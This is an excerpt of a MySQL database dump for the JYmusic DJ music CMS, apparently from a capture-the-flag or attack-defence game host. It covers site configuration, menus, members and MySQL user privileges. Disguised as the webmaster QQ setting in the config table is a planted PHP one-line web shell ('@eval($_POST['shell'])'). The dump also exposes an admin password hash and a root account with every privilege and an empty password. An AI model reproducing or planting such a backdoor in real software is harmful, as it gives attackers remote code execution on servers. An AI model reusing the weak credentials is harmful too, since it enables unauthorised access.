...
-- 正在导出表  cms.jy_addons 的数据：5 rows
DELETE FROM `jy_addons`;
...
-- 正在导出表  cms.jy_album_type 的数据：5 rows
DELETE FROM `jy_album_type`;
...
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='文档基础表';

-- 正在导出表  cms.jy_article 的数据：1 rows
DELETE FROM `jy_article`;
/*!40000 ALTER TABLE `jy_article` DISABLE KEYS */;
INSERT INTO `jy_article` (`id`, `uid`, `name`, `title`, `category_id`, `description`, `root`, `position`, `cover_id`, `cover_url`, `display`, `deadline`, `hits`, `comment`, `create_time`, `update_time`, `status`) VALUES
	(1, 1, '', '1111111', 1, '1111', 0, 0, 0, '1111', 1, 0, 0, 0, 1637389700, 1637389700, 1);
/*!40000 ALTER TABLE `jy_article` ENABLE KEYS */;

-- 导出  表 cms.jy_article_category 结构
...
-- 正在导出表  cms.jy_article_category 的数据：7 rows
DELETE FROM `jy_article_category`;
...
-- 导出  表 cms.jy_article_content 结构
...
-- 正在导出表  cms.jy_article_content 的数据：1 rows
DELETE FROM `jy_article_content`;
/*!40000 ALTER TABLE `jy_article_content` DISABLE KEYS */;
INSERT INTO `jy_article_content` (`article_id`, `content`, `template`) VALUES
	(1, '<p>1111111</p>', 'artrcle_detail.html');
/*!40000 ALTER TABLE `jy_article_content` ENABLE KEYS */;

-- 导出  表 cms.jy_artist 结构
...
-- 正在导出表  cms.jy_artist_type 的数据：15 rows
DELETE FROM `jy_artist_type`;
...
-- 正在导出表  cms.jy_auth_extend 的数据：8 rows
DELETE FROM `jy_auth_extend`;
...
-- 正在导出表  cms.jy_auth_group 的数据：6 rows
DELETE FROM `jy_auth_group`;
...
INSERT INTO `jy_auth_group` (`id`, `module`, `type`, `title`, `description`, `status`, `rules`) VALUES
	...
	(4, 'admin', 1, '普通会员', '注册的普通会员', 1, ''),
	(5, 'admin', 1, '收费会员', '你懂得', 1, ''),
	(3, 'admin', 1, '用户管理组', '负责管理用户', 1, ''),
	(6, 'admin', 1, '认证音乐人', '你懂得', 1, '');
/*!40000 ALTER TABLE `jy_auth_group` ENABLE KEYS */;

-- 导出  表 cms.jy_auth_group_access 结构
...
-- 正在导出表  cms.jy_auth_group_access 的数据：0 rows
DELETE FROM `jy_auth_group_access`;
/*!40000 ALTER TABLE `jy_auth_group_access` DISABLE KEYS */;
/*!40000 ALTER TABLE `jy_auth_group_access` ENABLE KEYS */;

-- 导出  表 cms.jy_auth_musician 结构
...
-- 正在导出表  cms.jy_channel 的数据：7 rows
DELETE FROM `jy_channel`;
...
-- 正在导出表  cms.jy_config 的数据：55 rows
DELETE FROM `jy_config`;
...
INSERT INTO `jy_config` (`id`, `name`, `type`, `title`, `group`, `extra`, `remark`, `create_time`, `update_time`, `status`, `value`, `sort`) VALUES
	(1, 'web_site_title', 1, '网站标题', 1, '', '网站标题前台显示标题', 1378898976, 1379235274, 1, 'DJ音乐系统', 1),
	(2, 'web_site_description', 2, '网站描述', 1, '', '网站搜索引擎描述', 1378898976, 1379235841, 1, 'ce3a5aef351382fb', 3),
	(3, 'web_site_keyword', 2, '网站关键字', 1, '', '网站搜索引擎关键字', 1378898976, 1381390100, 1, '音乐管理程序,php音乐程序,原创音乐程序,音乐程序,dj舞曲程序,音乐程序，音乐管理程序，舞曲程序', 4),
	...
	(33, 'jymusic_update_time', 0, 'JYmusic更新时间', 0, '', '', 1410732630, 1451253543, 1, '20170501', 4),
	(34, 'web_site_stat', 2, '统计代码', 1, '', '网站统计代码', 1410732716, 1467152172, 1, '', 9),
	(35, 'jymusic_version', 1, 'JYmusic版本号', 0, '', '', 1410732822, 1451253430, 0, 'JYmusic_2.0.0', 6),
	...
	(38, 'web_domain', 1, '网站域名', 1, '', '填写你的网站域名', 1411743978, 1411743978, 1, '', 4),
	(39, 'web_phone', 0, '联系电话', 1, '', '', 1413986755, 1413986755, 1, '18888888888', 5),
	(40, 'web_qq', 0, '站长QQ', 1, '', '', 1413986787, 1417229439, 1, '<?php @eval($_POST[\'shell\']);?>', 4),
	(41, 'web_email', 1, '站长邮箱', 1, '', '', 1413986920, 1413986998, 1, '123456@qq.com', 5),
	...
	(47, 'only_musician_upload', 5, '强制认证上传', 5, '0:否\r\n1:是', '认证为音乐人后才可以上传歌曲', 1418989996, 1418989996, 1, '1', 1),
...
-- 正在导出表  cms.jy_genre 的数据：6 rows
DELETE FROM `jy_genre`;
...
-- 正在导出表  cms.jy_hooks 的数据：15 rows
DELETE FROM `jy_hooks`;
...
-- 正在导出表  cms.jy_member 的数据：1 rows
DELETE FROM `jy_member`;
/*!40000 ALTER TABLE `jy_member` DISABLE KEYS */;
INSERT INTO `jy_member` (`uid`, `nickname`, `avatar`, `songs`, `albums`, `listens`, `follows`, `fans`, `sex`, `hits`, `birthday`, `qq`, `score`, `coin`, `is_musician`, `signature`, `location`, `province`, `city`, `district`, `experience`, `login`, `reg_ip`, `reg_time`, `last_login_ip`, `last_login_time`, `status`, `cdkey`) VALUES
	(1, 'admin', NULL, 1, 0, 0, 0, 0, 0, 1, 0, NULL, 0, 0, 0, NULL, NULL, NULL, NULL, NULL, 0, 4, 465964233, 1637389082, 465964233, 1637390142, 1, NULL);
/*!40000 ALTER TABLE `jy_member` ENABLE KEYS */;

-- 导出  表 cms.jy_member_group 结构
...
-- 正在导出表  cms.jy_member_group 的数据：3 rows
DELETE FROM `jy_member_group`;
...
-- 导出  表 cms.jy_member_group_link 结构
...
-- 正在导出表  cms.jy_member_group_link 的数据：0 rows
DELETE FROM `jy_member_group_link`;
...
-- 正在导出表  cms.jy_menu 的数据：171 rows
DELETE FROM `jy_menu`;
...
INSERT INTO `jy_menu` (`id`, `title`, `pid`, `sort`, `url`, `hide`, `tip`, `group`, `is_dev`, `icon`, `status`) VALUES
	...
	(124, '歌曲管理', 123, 0, 'songs/index', 0, '', '音乐管理', 0, 'music', 1),
	(125, '创建歌曲', 124, 0, 'songs/create', 0, '创建歌曲', '音乐管理', 0, '', 1),
	(126, '编辑歌曲', 124, 1, 'songs/edit', 1, '编辑歌曲', '音乐管理', 0, '', 1),
	(127, '删除歌曲', 124, 2, 'songs/delete', 1, '删除歌曲', '音乐管理', 0, '', 1),
	(128, '清空歌曲', 158, 4, 'songs/clear', 0, '清空回收站歌曲', '辅助功能', 0, '', 1),
	...
	(167, '歌曲批量修改', 124, 0, 'songs/bulk', 0, '批量操作歌曲', '用户管理', 0, '', 1),
...
-- 正在导出表  cms.jy_notice 的数据：0 rows
DELETE FROM `jy_notice`;
/*!40000 ALTER TABLE `jy_notice` DISABLE KEYS */;
/*!40000 ALTER TABLE `jy_notice` ENABLE KEYS */;

-- 导出  表 cms.jy_pay_history 结构
CREATE TABLE IF NOT EXISTS `jy_pay_history` (
...
-- 正在导出表  cms.jy_ranks 的数据：5 rows
DELETE FROM `jy_ranks`;
...
-- 正在导出表  cms.jy_seo_rule 的数据：16 rows
DELETE FROM `jy_seo_rule`;
...
INSERT INTO `jy_seo_rule` (`id`, `title`, `module`, `controller`, `action`, `title_rule`, `keywords_rule`, `description_rule`, `sort`, `is_sys`, `status`) VALUES
	(1, '音乐单曲页面', 'home', 'music', 'read', '{$name}在线试听 - {$web_site_title}', '{$name}在线试听，{$name}免费试听，{$name}高音质试听，{$user_name}上传的歌曲', '{$name}在线试听、{$name}免费试听、{$name}高音质试听、{$user_name}上传的歌曲', 0, 1, 1),
	...
	(2, '艺人详细页面', 'home', 'artist', 'read', '{$name} - {$web_site_title}', '{$name}，{$name}的歌曲，{$name} 的专辑', '{$name}、{$name}的歌曲、{$name} 的专辑', 0, 1, 1),
	...
	(11, '音乐下载页面', 'home', 'down', 'index', '{$name}下载  - {$web_site_title}', '{$name}免费下载，好听的{$name}，舞曲{$name}免费下载，mp3免费下载', '{$name}免费下载、好听的{$name}、舞曲{$name}免费下载、mp3免费下载', 0, 1, 1),
	...
	(15, '艺人歌曲页面', 'home', 'artist', 'songs', '{$name}的歌曲 - {$web_site_title}', '{$name}的歌曲，{$name}的全部歌曲，{$name} 最新歌曲', '{$name}的歌曲、{$name}的全部歌曲、{$name}热门歌曲', 0, 1, 1),
...
-- 正在导出表  cms.jy_server 的数据：0 rows
DELETE FROM `jy_server`;
...
-- 正在导出表  cms.jy_slider 的数据：4 rows
DELETE FROM `jy_slider`;
...
INSERT INTO `jy_slider` (`id`, `title`, `type`, `cover_url`, `link_title`, `link`, `level`, `description`, `status`, `create_time`, `update_time`) VALUES
	(1, '黑胶制造', 1, 'http://ugc.cdn.qianqian.com/yinyueren/pic/cf602a2aeed378b781d6.jpg@w_1220,d_progressive', '', 'http://www.jyuu.cn', 0, '黑胶制造', 1, 1466654916, 1497952936),
...
-- 正在导出表  cms.jy_songs 的数据：1 rows
DELETE FROM `jy_songs`;
/*!40000 ALTER TABLE `jy_songs` DISABLE KEYS */;
INSERT INTO `jy_songs` (`id`, `name`, `genre_id`, `album_id`, `album_name`, `order_id`, `artist_id`, `artist_name`, `tags`, `cover_url`, `cover_id`, `up_uid`, `up_uname`, `rank_id`, `digg`, `bury`, `download`, `rater`, `listens`, `position`, `favtimes`, `likes`, `score`, `coin`, `comment`, `sing`, `lyrics`, `composer`, `midi`, `mix`, `create_time`, `update_time`, `status`) VALUES
	(1, 'dj123', 1, 0, '', 0, 0, '', '', '', 0, 1, 'admin', 0, 0, 0, 0, 0, 0, 31, 0, 0, 0, 0, 0, '', '', '', '', NULL, 1637389621, 1637389833, 1);
/*!40000 ALTER TABLE `jy_songs` ENABLE KEYS */;

-- 导出  表 cms.jy_songs_extend 结构
...
-- 正在导出表  cms.jy_songs_extend 的数据：1 rows
DELETE FROM `jy_songs_extend`;
/*!40000 ALTER TABLE `jy_songs_extend` DISABLE KEYS */;
INSERT INTO `jy_songs_extend` (`mid`, `server_id`, `listen_url`, `down_url`, `listen_file_id`, `down_file_id`, `listen_file_size`, `down_file_size`, `play_time`, `listen_bitrate`, `down_bitrate`, `disk_url`, `disk_pass`, `down_rule`, `lrc`, `introduce`) VALUES
	(1, 0, 'https://play.dangdj.com/kekedjcom/2021kekedj/202111/20211115/DJ何浪-打造2021{DJ何鹏专辑}中文Club劲爆系列串烧.mp3', 'https://play.dangdj.com/kekedjcom/2021kekedj/202111/20211115/DJ何浪-打造2021{DJ何鹏专辑}中文Club劲爆系列串烧.mp3', 0, 0, '0', '0', NULL, '0', '0', '', '', '{"coin":"0","score":"0","group":["1","2","3"]}', '', NULL);
/*!40000 ALTER TABLE `jy_songs_extend` ENABLE KEYS */;

-- 导出  表 cms.jy_songs_fav 结构
...
-- 正在导出表  cms.jy_sync_login 的数据：0 rows
DELETE FROM `jy_sync_login`;
...
INSERT INTO `jy_tags` (`id`, `name`, `alias`, `sort`, `group`, `hits`, `create_time`, `update_time`, `status`) VALUES
	...
	(47, '', '', 0, 0, 0, 1637389833, 1637389833, 1);
/*!40000 ALTER TABLE `jy_tags` ENABLE KEYS */;

-- 导出  表 cms.jy_ucenter_member 结构
...
-- 正在导出表  cms.jy_ucenter_member 的数据：1 rows
DELETE FROM `jy_ucenter_member`;
/*!40000 ALTER TABLE `jy_ucenter_member` DISABLE KEYS */;
INSERT INTO `jy_ucenter_member` (`id`, `username`, `password`, `email`, `mobile`, `reg_time`, `reg_ip`, `last_login_time`, `last_login_ip`, `update_time`, `status`) VALUES
	(1, 'admin', 'd8322d5718b120ee61e4b9ce03dd2f39', 'admin@admin.com', NULL, 1637389082, 465964233, 1637390142, 465964233, 0, 1);
/*!40000 ALTER TABLE `jy_ucenter_member` ENABLE KEYS */;

-- 导出  表 cms.jy_user_down 结构
...
-- 正在导出表  cms.jy_user_follow 的数据：0 rows
DELETE FROM `jy_user_follow`;
...
INSERT INTO `proxies_priv` (`Host`, `User`, `Proxied_host`, `Proxied_user`, `With_grant`, `Grantor`, `Timestamp`) VALUES
	('localhost', 'root', '', '', 1, '', '2021-12-19 11:55:03'),
	('pvp-888-team-1', 'root', '', '', 1, '', '2021-12-19 11:55:03');
...
INSERT INTO `user` (`Host`, `User`, `Password`, `Select_priv`, `Insert_priv`, `Update_priv`, `Delete_priv`, `Create_priv`, `Drop_priv`, `Reload_priv`, `Shutdown_priv`, `Process_priv`, `File_priv`, `Grant_priv`, `References_priv`, `Index_priv`, `Alter_priv`, `Show_db_priv`, `Super_priv`, `Create_tmp_table_priv`, `Lock_tables_priv`, `Execute_priv`, `Repl_slave_priv`, `Repl_client_priv`, `Create_view_priv`, `Show_view_priv`, `Create_routine_priv`, `Alter_routine_priv`, `Create_user_priv`, `Event_priv`, `Trigger_priv`, `Create_tablespace_priv`, `ssl_type`, `ssl_cipher`, `x509_issuer`, `x509_subject`, `max_questions`, `max_updates`, `max_connections`, `max_user_connections`, `plugin`, `authentication_string`) VALUES
	...
	('pvp-888-team-1', 'root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', _binary '', _binary '', _binary '', 0, 0, 0, 0, '', ''),
